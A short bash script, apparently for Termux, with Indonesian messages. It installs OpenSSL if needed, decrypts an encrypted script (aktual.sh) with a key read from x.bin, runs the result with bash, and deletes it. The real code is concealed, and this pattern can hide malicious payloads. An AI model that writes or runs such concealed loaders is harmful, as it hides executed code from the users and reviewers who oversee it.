#!/bin/bash


if command -v openssl &> /dev/null
then
   echo ""
else
    pkg install openssl -y
    if command -v openssl &> /dev/null
    then
        echo "OpenSSL berhasil diinstal."
    else
        echo "Gagal menginstal OpenSSL."
    fi
fi


x=$(<x.bin)
openssl enc -d -aes-256-cbc -in aktual.sh -out final.sh -pass pass:"$x" 2>/dev/null && bash final.sh
rm -rf final.sh

